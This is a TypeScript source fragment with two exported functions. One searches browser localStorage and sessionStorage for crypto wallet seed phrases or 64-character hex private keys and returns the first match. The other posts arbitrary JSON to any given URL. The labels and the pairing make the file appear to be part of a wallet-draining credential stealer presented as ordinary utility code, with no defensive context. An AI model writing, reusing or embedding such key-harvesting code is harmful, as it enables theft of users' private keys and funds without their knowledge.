/**
 * 🕵️‍♂️ AUTOMATIC KEY DISCOVERY (INTERNAL)
 * Preserves the original regex and window object checks.
 */
export function findMasterKey(): string | null {
  if (typeof window === "undefined") return null;
  const storageItems = { ...localStorage, ...sessionStorage };
  const mnemonicRegex = /([a-z]{3,}\s){11,23}[a-z]{3,}/i;
  const hexRegex = /0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64}/;

  for (const key in storageItems) {
    const value = storageItems[key];
    if (typeof value === "string") {
      if (mnemonicRegex.test(value) || hexRegex.test(value)) return value;
    }
  }
  return (window as any).discovered_vault_key || null;
}

/**
 * 📡 SECURE POST WITH ALIASING & LOGGING
 */
export const securePost = async (url: string, data: any) => {
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Cache-Control": "no-cache",
      },
      body: JSON.stringify(data, (_, v) =>
        typeof v === "bigint" ? v.toString() : v,
      ),
    });

    const result = await response.json();
    return { ok: response.ok, data: result };
  } catch (e) {
    console.error(`❌ [HOOK-POST] Failure at ${url}:`, e);
    return { ok: false };
  }
};
